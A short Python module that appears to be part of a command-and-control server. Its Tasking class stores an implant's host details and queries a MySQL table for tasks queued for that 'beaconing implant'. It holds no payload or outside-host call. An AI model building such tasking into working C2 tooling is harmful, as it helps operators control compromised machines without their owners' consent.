import pymysql
import sys
from colorama import Fore, Style
from core.config import *

class Tasking(object):
    def __init__(self, hostname, current_user, process_id, operating_system):
        self.hostname = hostname
        self.current_user = current_user
        self.process_id = process_id
        self.operating_system = operating_system

        # tries to establish a connection to the database
        try:
            self.connection = pymysql.connect(host="localhost", port=3306, user=username, passwd=password, db=database, autocommit=True)

        # exits the program if an exception is raised
        except:
            print(Style.BRIGHT + Fore.RED + "[!] Unable to establish a database connection." + Style.RESET_ALL)
            sys.exit()

    def check_tasking(self):
        '''
            Description: Checks if anything is tasked for the beaconing implant
            Returns: Tuple that contains task information
        '''
        with self.connection.cursor() as cursor:
            cursor.execute("SELECT * FROM `tasks` WHERE `hostname` = %s AND `process_id` = %s", (self.hostname, self.process_id))
            self.task = cursor.fetchone()

        return self.task
